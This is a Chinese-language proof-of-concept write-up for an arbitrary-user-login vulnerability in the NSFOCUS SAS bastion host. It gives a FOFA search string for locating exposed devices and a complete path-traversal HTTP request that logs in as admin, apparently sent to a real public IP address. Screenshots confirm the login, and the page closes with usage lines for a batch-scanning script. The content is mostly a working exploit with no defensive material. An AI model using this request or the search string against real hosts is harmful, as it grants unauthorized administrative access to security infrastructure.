# 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

### 1.漏洞描述

绿盟堡垒机存在任意用户登录漏洞，攻击者通过漏洞包含 www/local_user.php 实现任意⽤户登录

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719487092994-e4fea1fd-973a-430a-adab-aef472f1901a.png)

### 2.fofa语法

```plain
body="'/needUsbkey.php?username='"
```

### 3.漏洞复现

```plain
GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
Host: 115.233.211.203
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719487297499-d6c71d48-fb16-454c-8f27-e10ad813fcee.png)

登录成功

![img](https://cdn.nlark.com/yuque/0/2024/png/42783549/1719487263928-ac3127d3-5d77-4b0b-a348-763ee329e3a6.png)

### 4.py脚本使用

```
python3 文件名 -f url.txt # 批量测试url
python3 文件名 -u http://127.0.0.1 # 单个测试url
```
